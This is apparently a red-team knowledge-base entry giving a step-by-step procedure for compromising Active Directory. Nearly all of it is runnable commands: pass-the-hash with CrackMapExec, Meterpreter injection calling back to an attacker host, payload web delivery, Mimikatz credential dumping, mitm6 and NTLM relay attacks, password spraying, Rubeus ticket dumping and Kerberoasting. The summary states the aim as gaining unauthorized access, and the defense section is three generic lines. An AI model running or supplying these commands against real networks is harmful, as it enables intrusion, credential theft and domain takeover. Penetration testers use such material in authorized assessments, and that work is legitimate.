---
id: "3e7554a6-e348-42ff-b4db-141424f3c9a6"
name: "Active Directory Assessment and Privilege Escalation"
type: procedure
verified: false
submitted: false
created_at: "2023-04-06T03:56:01.897836+00:00"
updated_at: "2023-05-25T20:03:16.795391+00:00"
tactics: ["[[Credential Access|TA0006 - Credential Access]]","[[Discovery|TA0007 - Discovery]]","[[Lateral Movement|TA0008 - Lateral Movement]]"]
techniques: ["[[Domain Trust Discovery|T1482 - Domain Trust Discovery]]","[[Kerberoasting|T1208 - Kerberoasting]]","[[Pass the Ticket|T1097 - Pass the Ticket]]","[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]"]
sub_techniques: ["[[AS-REP Roasting|T1558.004 - AS-REP Roasting]]","[[Kerberoasting|T1558.003 - Kerberoasting]]"]
tags: ["[[Active Directory Attacks]]","[[Tools]]"]
commands: ["[[ADRecon.ps1]]","[[Ask TGT Ticket]]","[[Clone mitm6 repository]]","[[Download CME and execute smb module]]","[[Dump Ticket]]","[[Execute mimikatz server with http and port 80]]","[[Execute smb module to list shares]]","[[Execute smb module with authentication]]","[[Execute smb module with domain and module name]]","[[Execute smb module with metinject module and LHOST/LPORT options]]","[[Execute smb module with mimikatz module and local authentication]]","[[Execute smb module with module name and variable data]]","[[Execute smb module with RDP module and enable action]]","[[Execute smb module with smbexec method and command]]","[[Execute smb module with web_delivery module and URL option]]","[[Install mitm6]]","[[Kerberoasting]]","[[Kerberos List]]","[[Kerbrute Password Spray]]","[[PingCastle Graph]]","[[PingCastle Health Check]]","[[PingCastle Health Check with Advanced Options]]","[[PingCastle Scanner]]","[[Run mitm6]]","[[Run ntlmrelayx.py for LDAP relay]]","[[Run ntlmrelayx.py for SMB relay]]"]
platforms: ["Windows", "Linux"]
tools: ["[[CrackMapExec]]", "[[Rubeus]]", "[[Kerbrute]]", "[[PingCastle]]", "[[mitm6]]", "[[ntlmrelayx]]", "[[ADRecon]]", "[[ADAPE]]"]
---

# Active Directory Assessment and Privilege Escalation

## Summary

Active Directory Assessment and Privilege Escalation is a procedure that enables a user to assess an Active Directory environment for vulnerabilities and escalate privileges to gain unauthorized access. This procedure involves using various tools and techniques to enumerate domain information, identify vulnerable systems, and exploit them to gain higher privileges.

## Description

This procedure focuses on assessing and exploiting vulnerabilities within an Active Directory (AD) environment to escalate privileges. The attack scenario assumes initial access to a domain-joined system or compromised credentials, targeting Windows-based AD infrastructures. Tools such as CrackMapExec (CME), Rubeus, Kerbrute, PingCastle, mitm6, and others are used to perform reconnaissance, password spraying, Kerberoasting, relay attacks, and privilege escalation. Prerequisites include network access to the AD domain, necessary tools installed, and potentially low-level credentials. Expected outcomes include discovery of AD objects, extraction of credentials, lateral movement, and achievement of domain admin privileges.

## Requirements

1. Access to the Active Directory environment
2. Credentials with appropriate permissions
3. Tools like CrackMapExec, Rubeus, and Kerbrute

## Defense

Defensive measures and detection strategies:

- Implement least privilege access controls to limit the impact of privilege escalation attacks
- Enable multi-factor authentication to prevent unauthorized access to the Active Directory environment
- Regularly review and update security policies and procedures to ensure they are up-to-date and effective

## Objectives

1. Assess the security posture of the Active Directory environment
2. Identify vulnerabilities and exploit them to escalate privileges
3. Remediate vulnerabilities and improve the overall security posture

## Instructions

### Step 1: Download and List CME SMB Modules

**Context**: Download the latest CrackMapExec (CME) and list available SMB modules for enumeration and exploitation.

**Command** ([[Download CME and execute smb module]]):
```bash
root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
root@payload$ cme smb -L
```

> This downloads CME and lists SMB modules to prepare for further commands.

### Step 2: Execute CME SMB Module with Variable Data

**Context**: Execute a specific CME SMB module with custom variables.

**Command** ([[Execute smb module with module name and variable data]]):
```bash
root@payload$ cme smb -M name_module -o VAR=DATA
```

> Runs the specified module with provided variables for targeted execution.

### Step 3: Authenticate with CME SMB

**Context**: Authenticate to a target using CME with provided credentials.

**Command** ([[Execute smb module with authentication]]):
```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
```

> Authenticates to the target SMB service using local authentication.

### Step 4: List Shares with CME

**Context**: List available shares on the target using CME.

**Command** ([[Execute smb module to list shares]]):
```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
```

> Enumerates shared resources on the target machine.

### Step 5: Execute CME with Domain and Module

**Context**: Run a CME module with domain specification.

**Command** ([[Execute smb module with domain and module name]]):
```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
```

> Executes the invoke_sessiongopher module in the specified domain.

### Step 6: Enable RDP with CME

**Context**: Enable RDP on the target using CME.

**Command** ([[Execute smb module with RDP module and enable action]]):
```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
```

> Enables Remote Desktop Protocol on the target.

### Step 7: Metinject with CME

**Context**: Inject Meterpreter using CME.

**Command** ([[Execute smb module with metinject module and LHOST/LPORT options]]):
```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
```

> Injects a Meterpreter payload to the target.

### Step 8: Web Delivery with CME

**Context**: Use web delivery module in CME.

**Command** ([[Execute smb module with web_delivery module and URL option]]):
```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
```

> Delivers a payload via web URL.

### Step 9: Execute Command with SMBExec

**Context**: Execute a command using SMBExec method in CME.

**Command** ([[Execute smb module with smbexec method and command]]):
```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
```

> Runs the specified command on the target.

### Step 10: Mimikatz with CME

**Context**: Run Mimikatz module with local auth in CME.

**Command** ([[Execute smb module with mimikatz module and local authentication]]):
```bash
root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
```

> Executes Mimikatz for credential dumping.

### Step 11: Start Mimikatz Server

**Context**: Start a Mimikatz server on HTTP port 80.

**Command** ([[Execute mimikatz server with http and port 80]]):
```bash
root@payload$ cme mimikatz --server http --server-port 80
```

> Sets up a Mimikatz server for further interactions.

### Step 12: Clone mitm6 Repository

**Context**: Clone the mitm6 repository for MITM attacks.

**Command** ([[Clone mitm6 repository]]):
```bash
git clone https://github.com/fox-it/mitm6.git && cd mitm6
```

> Prepares the mitm6 tool.

### Step 13: Install mitm6

**Context**: Install the mitm6 tool.

**Command** ([[Install mitm6]]):
```bash
pip install .
```

> Installs dependencies for mitm6.

### Step 14: Run mitm6

**Context**: Run mitm6 against the specified domain.

**Command** ([[Run mitm6]]):
```bash
mitm6 -d lab.local
```

> Starts the MITM attack.

### Step 15: Run ntlmrelayx for SMB Relay

**Context**: Relay NTLM for SMB.

**Command** ([[Run ntlmrelayx.py for SMB relay]]):
```bash
ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
```

> Relays credentials to SMB target.

### Step 16: Run ntlmrelayx for LDAP Relay

**Context**: Relay NTLM for LDAP with delegate access.

**Command** ([[Run ntlmrelayx.py for LDAP relay]]):
```bash
ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
```

> Relays to LDAP and delegates access.

### Step 17: Run ADRecon

**Context**: Perform AD reconnaissance.

**Command** ([[ADRecon.ps1]]):
```bash
.\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
```

> Enumerates AD objects and vulnerabilities.

### Step 18: Run ADAPE

**Context**: Assess AD for privilege escalation paths.

**Command** ([[ADAPE.ps1]]):
```bash
powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1
```

> Identifies potential escalation paths.

### Step 19: PingCastle Health Check with Options

**Context**: Perform advanced health check.

**Command** ([[PingCastle Health Check with Advanced Options]]):
```bash
pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
```

> Runs comprehensive AD security check.

### Step 20: PingCastle Health Check

**Context**: Basic health check.

**Command** ([[PingCastle Health Check]]):
```bash
pingcastle.exe --healthcheck --server domain.local
```

> Performs basic AD health check.

### Step 21: PingCastle Graph

**Context**: Generate AD graph.

**Command** ([[PingCastle Graph]]):
```bash
pingcastle.exe --graph --server domain.local
```

> Creates visual AD representation.

### Step 22: PingCastle Scanner

**Context**: Run specific scanner.

**Command** ([[PingCastle Scanner]]):
```bash
pingcastle.exe --scanner scanner_name --server domain.local
```

> Scans for specific vulnerabilities.

### Step 23: Kerbrute Password Spray

**Context**: Perform password spray attack.

**Command** ([[Kerbrute Password Spray]]):
```bash
./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
```

> Tests passwords against user list.

### Step 24: Request TGT with Rubeus

**Context**: Ask for Kerberos TGT.

**Command** ([[Ask TGT Ticket]]):
```bash
Rubeus.exe asktgt /user:USER /password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
```

> Requests a Ticket Granting Ticket.

### Step 25: Dump Tickets with Rubeus

**Context**: Dump Kerberos tickets.

**Command** ([[Dump Ticket]]):
```bash
Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
```

> Extracts tickets from memory.

### Step 26: List Kerberos Tickets

**Context**: List current tickets.

**Command** ([[Kerberos List]]):
```bash
Rubeus.exe klist [/luid:LOGINID]
```

> Displays Kerberos tickets.

### Step 27: Perform Kerberoasting

**Context**: Kerberoast service accounts.

**Command** ([[Kerberoasting]]):
```bash
Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
```

> Requests and cracks service tickets.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Discovery|TA0007 - Discovery]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Domain Trust Discovery|T1482 - Domain Trust Discovery]]
- [[Kerberoasting|T1208 - Kerberoasting]]
- [[Pass the Ticket|T1097 - Pass the Ticket]]
- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[AS-REP Roasting|T1558.004 - AS-REP Roasting]]
- [[Kerberoasting|T1558.003 - Kerberoasting]]

## Commands Used

- [[ADRecon.ps1]]
- [[Ask TGT Ticket]]
- [[Clone mitm6 repository]]
- [[Download CME and execute smb module]]
- [[Dump Ticket]]
- [[Execute mimikatz server with http and port 80]]
- [[Execute smb module to list shares]]
- [[Execute smb module with authentication]]
- [[Execute smb module with domain and module name]]
- [[Execute smb module with metinject module and LHOST/LPORT options]]
- [[Execute smb module with mimikatz module and local authentication]]
- [[Execute smb module with module name and variable data]]
- [[Execute smb module with RDP module and enable action]]
- [[Execute smb module with smbexec method and command]]
- [[Execute smb module with web_delivery module and URL option]]
- [[Install mitm6]]
- [[Kerberoasting]]
- [[Kerberos List]]
- [[Kerbrute Password Spray]]
- [[PingCastle Graph]]
- [[PingCastle Health Check]]
- [[PingCastle Health Check with Advanced Options]]
- [[PingCastle Scanner]]
- [[Run mitm6]]
- [[Run ntlmrelayx.py for LDAP relay]]
- [[Run ntlmrelayx.py for SMB relay]]

## Tools Used

- [[CrackMapExec]]
- [[Rubeus]]
- [[Kerbrute]]
- [[PingCastle]]
- [[mitm6]]
- [[ntlmrelayx]]
- [[ADRecon]]
- [[ADAPE]]

## Tags

- [[Active Directory Attacks]]
- [[Tools]]
